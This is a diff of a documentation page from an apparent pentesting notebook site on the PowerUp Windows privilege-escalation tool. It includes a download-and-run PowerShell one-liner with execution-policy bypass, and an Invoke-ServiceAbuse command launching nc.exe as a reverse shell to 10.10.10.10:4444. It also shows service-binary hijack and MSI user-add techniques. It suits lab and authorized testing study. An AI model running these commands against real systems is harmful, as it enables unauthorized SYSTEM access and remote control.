@@ -9,6 +9,30 @@ hideFooterPagination: true
 
 {/* Generated from Commands/powerup.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## PowerUp: choose the operation and read the result
+
+Commands and examples collected from your PowerUp notes.
+
+### What the result establishes
+
+Read each finding's exact writable object and proposed action before verifying it manually.
+
+### Prerequisites and common failures
+
+Automated checks are leads; service rights, file permissions and the current token must align for the reported path to work.
+
+### Example 1: Tools
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```powershell
+powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your PowerUp notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=powerup) · [All tools](/index)
 
 ## Tools
@@ -18,6 +42,13 @@ hideFooterPagination: true
 ```powershell
 powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Tools](/privesc/windows-privesc-checklist#tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -43,6 +74,13 @@ sc stop <service> & sc start <service>
 powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — E. Service & path abuse (normal-user → SYSTEM)](/cheatsheets/windows-post-exploitation#e-service-&-path-abuse-normal-user-→-system)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="PHASE B — PrivEsc enumeration">
@@ -59,6 +97,13 @@ powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 # WES-NG (run offline on Kali against systeminfo output) — kernel exploit suggester
 systeminfo > sysinfo.txt    # then on Kali: wes.py sysinfo.txt
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — PHASE B — PrivEsc enumeration](/cheatsheets/windows-post-exploitation#phase-b-—-privesc-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -84,6 +129,13 @@ AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
 Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Unquoted Service Paths](/privesc/windows-privesc-checklist#eop-unquoted-service-paths)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="AlwaysInstallElevated">
@@ -98,6 +150,13 @@ Context from the notebook: PowerUp.ps1 :  Get-RegistryAlwaysInstallElevated ,  W
 Get-RegistryAlwaysInstallElevated
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 Context from the notebook: PowerUp.ps1 :  Get-RegistryAlwaysInstallElevated ,  Write-UserAddMSI
@@ -106,6 +165,22 @@ Context from the notebook: PowerUp.ps1 :  Get-RegistryAlwaysInstallElevated ,  W
 Write-UserAddMSI
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — AlwaysInstallElevated](/privesc/windows-privesc-checklist#alwaysinstallelevated)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+- [Windows Post-Exploitation: Field Reference](/cheatsheets/windows-post-exploitation)
+
+{/* VAULT_RELATED_END */}
